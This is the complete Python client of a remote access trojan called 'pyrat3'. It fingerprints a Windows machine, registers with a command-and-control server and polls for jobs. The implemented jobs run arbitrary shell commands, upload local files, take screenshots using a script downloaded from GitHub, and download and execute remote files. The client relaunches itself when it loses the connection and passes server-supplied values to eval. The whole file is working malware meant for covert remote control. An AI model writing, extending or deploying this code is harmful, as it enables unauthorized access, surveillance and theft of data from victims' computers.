# -*- coding: utf-8 -*-

import os
import sys
import shutil
import socket
import platform
import requests
import subprocess
import tkinter as tk
from uuid import getnode
from ast import literal_eval
from tkinter import messagebox
from time import gmtime, strftime, sleep


HOME = "http://127.0.0.1:8000/pyrat3_server/api/"


def curr_datetime():
    return strftime("%Y-%m-%d %H:%M:%S", gmtime())


class Client:

    """
    Create object with gathered about local machine informations.
    Object is also responsible for communication with server.
    """

    def __init__(self):
        # Code for gain MAC-adress found on Stackoverflow
        # https://stackoverflow.com/questions/159137/getting-mac-address
        self.det_mac = "".join(
            ("%012X" % getnode())[i: i + 2] for i in range(0, 12, 2)
        )
        self.det_os = platform.system() + platform.release()
        self.det_name = os.environ["COMPUTERNAME"]
        self.det_int_ip = socket.gethostbyname(socket.gethostname())
        self.det_ext_ip = requests.get("https://api.ipify.org").text
        self.country = self._get_country()
        # Due to limitation in imported modules, replace used instead regex module
        self.pc_uuid = (
            subprocess.check_output(
                "wmic csproduct get UUID",
                shell=True,
                universal_newlines=True,
                stderr=subprocess.PIPE,
            )
            .replace(" ", "")
            .replace("\r", "")
            .replace("\n", "")
            .replace("UUID", "")
        )
        # Codepage is necessary to parse command output in proper way
        self.codepage = "cp{}".format(
            "".join(
                [
                    s
                    for s in subprocess.check_output("chcp", shell=True).decode("utf-8")
                    if s.isdigit()
                ]
            )
        )
        # Data used to identify client in server
        self.user_data = {
            "pc_uuid": self.pc_uuid,
            "mac": self.det_mac,
            "os": self.det_os,
            "name": self.det_name,
            "int_ip": self.det_int_ip,
            "ext_ip": self.det_ext_ip,
            "country": self.country,
        }

        self.headers = requests.utils.default_headers().update({"User-Agent": "pyrat3"})
        # client_id to be set after registration or validation as know client
        self.client_id = None

    @property
    def client_home(self):
        return f"{HOME}{self.client_id}/"

    @property
    def client_home_files(self):
        return f"{HOME}{self.client_id}/upload/"

    def _get_country(self):

        country = requests.get(
            f"http://ip-api.com/json/{self.det_ext_ip}?fields=status,message,countryCode"
        ).json()
        if country["status"] == "success":
            return country["countryCode"]
        else:
            return "??"

    def register_at_db(self):

        get_status = requests.post(HOME, json=self.user_data)
        status_message = get_status.json()["message"]
        self.client_id = get_status.json()["client_id"]
        status_code = get_status.status_code
        print(f"Client ID: {self.client_id}")
        print(f"Client status: {status_message} ({status_code})")
        if status_code == 400:
            raise RuntimeError("Unable to register client")

    def send_data(self, data, *args):

        """
        Function used to send data to server. Necessary is to specify data to be send.
        In one function call is possible,  to make two requests: one for a text-data
        (dict) and second for object via POST multipart/form-data form.
        :param data: Data delivered to server; for REST-API communication, it should be
        a dict. Obligatory parameter.
        :param args: Only args[0] will be considered. Reserved for file uploading to
        server. It should be object (for example image).
        :return: Response from server in JSON format.
        """

        if args and args[0]:
            say_catch_file = requests.post(
                self.client_home_files, data=data, headers=self.headers, files=args[0]
            )
        say_catch = requests.patch(self.client_home, json=data, headers=self.headers)
        return say_catch.json()

    def get_data(self):

        """
        Function fetching data from server - only for client called within instance.
        :return: Response from server in JSON format.
        """

        say_give = requests.get(self.client_home, headers=self.headers)
        return say_give.json()


class AvailableJobs:

    """
    Each function should return data contains specify values: job_id and current
    date and time. It's important on server side to specify current status of client
    (WORKING, IDDLE, OFFLINE). Returned object must be a dict with {'confirmation': value}
    pair (where value is a string)
    """

    def __init__(self, client, job_id):
        self.client = client
        self.job_id = job_id

    # TODO: decorator for make writing of new jobs(arguments) much easier

    def popup(self, title, text):

        """
        Display a message for user.
        :param title: Window title.
        :param text:  Window text.
        :return: Dict with result as string
        """

        r_window = tk.Tk()
        r_window.withdraw()
        # Destroy window (after scheduled time) if there is no reaction from user side
        r_window.after(30000, r_window.destroy)
        if messagebox.showinfo(text, title):
            r_window.destroy()
        confirmation = (
            f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) \nMessagebox showed"
        )
        return {"confirmation": confirmation}

    def run_command(self, terminal, **kwargs):

        """
        Run command on terminal or directly.
        :param terminal: Boolean value (True or False).
        :param kwargs: Dict with main command and additional parameters.
        :return: Dict with result as string.

        Each arg is attached to list (because subprocess can be called with
        list or string as command). If terminal == True, command is called via
        subprocess.check_output (to get command output as string).
        Each output from cmd.exe must be decoded according to system codepage to
        keep all standard characters and whitespace characters. If command is
        called directly (terminal == False), subprocess.Popen is used. There is
        no output from called command. For both methods, exception will be cached,
        if command or executable file is not recognized/not exists.
        """

        if kwargs:
            arg_list = []
            # Add each arg to list
            for key, value in kwargs.items():
                arg_list.append(value)
            if terminal:
                try:
                    output = subprocess.check_output(
                        arg_list, shell=True, stderr=subprocess.PIPE
                    ).decode(self.client.codepage)
                    confirmation = (
                        f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) \n{output}"
                    )
                except subprocess.CalledProcessError:
                    confirmation = (
                        f"[{self.job_id}] [FAIL] ({curr_datetime()}) Unknown command"
                    )
            else:
                try:
                    subprocess.Popen(
                        arg_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                    )
                    confirmation = f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) \n{arg_list[0]} executed"
                except FileNotFoundError:
                    confirmation = f"[{self.job_id}] [FAIL] ({curr_datetime()}) Executable file not found"
            return {"confirmation": confirmation}
        else:
            confirmation = f"[{self.job_id}] [FAIL] ({curr_datetime()})"
            return {"confirmation": confirmation}

    def file_upload(self, file_path):

        """
        Upload local file to server.
        :param file_path: Path to requested local file (file, which should be
        uploaded to server).
        :return: Dict with result as string and requested file-object

        Result of function is depending of file existing. If  file exists, there
        is a dict with result as string, and a file-object returned. If fail, only
        dict with result is returned.
        """

        try:
            if os.path.isfile(file_path):
                file = {"file": open(file_path, "rb")}
                confirmation = f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) \nFile {file_path} uploaded"
                return {"confirmation": confirmation, "file": file}
            else:
                confirmation = f"[{self.job_id}] [FAIL] ({curr_datetime()}) \nFile {file_path} not exists"
                return {"confirmation": confirmation}
        # Catch exception if there is problem with file-read (system file, currently in use etc)
        except IOError:
            confirmation = f"[{self.job_id}] [FAIL] ({curr_datetime()}) \nProblem with access to file {file_path}"
            return {"confirmation": confirmation}

    def screenshot(self, **kwargs):

        """
        Make screenshot and upload it to server.
        :param kwargs: Fake args, to unify way of calling methods in main()
        function.
        :return: Dict with result as string and image object.

        To reduce of using external Python modules, screen is captured using
        self-compiling C# file. Great tool was provided by Vasil Arnaudov
        (https://github.com/npocmaka). If screen capturing (called using
        another method within instance) is successful, dictionary with
        result and file-object wil be returned. Else only dict with result
        will be returned.
        """

        # Get temp dir for current user
        temp_dir = os.path.expanduser("~") + "\\AppData\\Local\\Temp\\"
        bat_url = "https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat"
        r = requests.get(bat_url)
        with open(f"{temp_dir}screenCapture.bat", "w") as f:
            # Save file source as text
            f.write(r.text)
        # Replace all characters, which could generate problems
        screen_name = "%s.jpg" % (curr_datetime().replace(" ", "_").replace(":", "_"))
        args_dict = {
            "arg0": "cd",
            "arg1": temp_dir,
            "arg2": "&&",
            "arg3": "screenCapture.bat",
            "arg4": screen_name,
        }
        # Call another method within instance
        make_screenshot = self.run_command(terminal=True, **args_dict)
        file = {"file": open(temp_dir + screen_name, "rb")}
        confirmation = f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) Screenshot {screen_name}  was made & uploaded"
        if "SUCCESS" in make_screenshot["confirmation"]:
            return {"confirmation": confirmation, "file": file}
        else:
            confirmation = f"[{self.job_id}] [FAIL] ({curr_datetime()}) Screenshot {screen_name}  was not made"
            return {"confirmation": confirmation}

    def file_download(self, url, save_path, execute):

        """
        Download file to local machine, and run if requested.
        :param url: URL of requested (to be downloaded) file.
        :param save_path: Path for save requested file on local machine
        :param execute: Boolean value (True or False).
        :return: Dict with result as string.

        Get binary object and save it to local machine. Execute downloaded
        file if 'execute' == True.Return dictionary with result. Catch exception
        and return information when failure.
        """

        file_name = url.split("/")[-1]
        # Download file as binary object
        file = requests.get(url, stream=True)
        try:
            file_path = f"{save_path}\\{file_name}"
            with open(file_path, "wb") as f:
                # Save file as binary object
                shutil.copyfileobj(file.raw, f)
            if execute:
                args_dict = {"terminal": False, "args0": file_path}
                # Call another method within instance
                self.run_command(**args_dict)
                confirmation = f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) File {url} downloaded, executed"
                return {"confirmation": confirmation}
            else:
                confirmation = f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) File {url} downloaded, not executed"
                return {"confirmation": confirmation}
        except IOError as e:

            """
            Catch exception if there is problem with access 
            to requested location for file save
            """

            print(e)
            confirmation = f"[{self.job_id}] [FAIL] ({curr_datetime()}) File {url} not downloaded and/or not executed"
            return {"confirmation": confirmation}


def main():

    """
    Main function for managing jobs.
    :return: None

    First, get script path (for further re-runs of script).
    NOTE: try/except condition is necessary when client is packed to
    executable file via pyInstaller. See:
    https://pyinstaller.readthedocs.io/en/v3.3.1/runtime-information.html
    Next, try to connect to server and after success, create client
    object and necessary lists for job_id management.
    Go to loop and check that there is something to do.
    """

    try:
        getattr(sys, 'frozen', False)
        rerun_client = [sys.argv[0]]
    except AttributeError:
        rerun_client = ["python", os.path.abspath(__file__)]

    def connect_or_kill(try_count):

        """
        Connect to a server.
        :param try_count: Integer; how many repeats script should perform after
        self-termination
        :return: None

        Calling a function within instance and if expected data will be returned,
        break the loop. If try_count == 0, execute another instance and kill
        existing.
        """

        print(
            """\
         ______   __  __     ______     ______     ______
        /\  == \ /\ \_\ \   /\  == \   /\  __ \   /\__  _\\
        \ \  _-/ \ \____ \  \ \  __<   \ \  __ \  \/_/\ \/
         \ \_\    \/\_____\  \ \_\ \_\  \ \_\ \_\    \ \_\\
          \/_/     \/_____/   \/_/ /_/   \/_/\/_/     \/_/
        """
        )

        messages = {
            "attempt": "CLIENT REGISTRATION: TRY TO CONNECT TO CC, ATTEMPT",
            "fail": "CLIENT REGISTRATION: UNABLE TO CONNECT, PAUSE FOR 5 SECONDS",
            "kill": "CLIENT REGISTRATION: UNABLE TO CONNECT, KILLING CURRENT INSTANCE",
        }

        max_count = try_count

        attempt = messages["attempt"]
        fail = messages["fail"]
        kill = messages["kill"]

        while try_count:
            try:
                print(f"++++ {attempt} {max_count - try_count + 1} OF {max_count} ++++")

                """
                Client-object declaration can produce exception (due to no connection) 
                because it try to gather informations about det_ext_ip and country.
                If there is a success, object client will be returned.
                """

                client = Client()
                client.register_at_db()
                return client
            except Exception as e:
                print(e)
                try_count -= 1
                if not try_count:
                    subprocess.Popen(rerun_client)
                    print(f"++++ {kill} ++++")
                    raise SystemExit
                else:
                    print(f"++++ {fail} ++++")
                    sleep(5)

    client = connect_or_kill(4)
    received_job_id = []
    sent_job_id = []

    iter_counter = 1

    while True:
        print("++++ NEW ITERATION: PRINTING LISTS ++++")
        print(f"Received jobs (basing on job_id's): {received_job_id}")
        print(f"Sent jobs (basing on job_id's): {sent_job_id}")
        # Fetch data for already registered client
        try:
            get_job = client.get_data()
        except Exception:
            subprocess.Popen(rerun_client)
            print(
                f"++++ NEW ITERATION: UNABLE TO CONNECT, KILLING CURRENT INSTANCE ++++"
            )
            raise SystemExit
        job = get_job.get("job")
        # Convert string to dict, and next string to bool if key is 'terminal' or 'execute'
        job_args = {
            k: eval(v) if "execute" in k or "terminal" in k else v
            for k, v in literal_eval(get_job.get("job_args")).items()
        }
        job_id = get_job["job_id"]
        # If job is not yet executed, try to run it
        if job_id not in (received_job_id and sent_job_id):
            try:
                # Create object
                available_jobs = AvailableJobs(client, job_id)
                # Search for method in object
                job_to_run = getattr(available_jobs, job)
                # Run job
                job_result = job_to_run(**job_args)
                # Add job_id to list of received jobs
                received_job_id.append(job_id)
                client.send_data(
                    {"job_result": job_result.get("confirmation")},
                    job_result.get("file", None),
                )
                # Add job_id to lists of jobs already performed and reported to server
                sent_job_id.append(job_id)
            # If job is not available in object (there is no method to call), skip
            except AttributeError:
                pass
        # Send information to server, that instance is alive
        ping = {"last_activity_datetime": strftime("%Y-%m-%d %H:%M:%S", gmtime())}
        client.send_data(ping)
        print(f"++++ END OF ITERATION #{iter_counter} ++++")
        iter_counter += 1
        sleep(5)


if __name__ == "__main__":
    main()
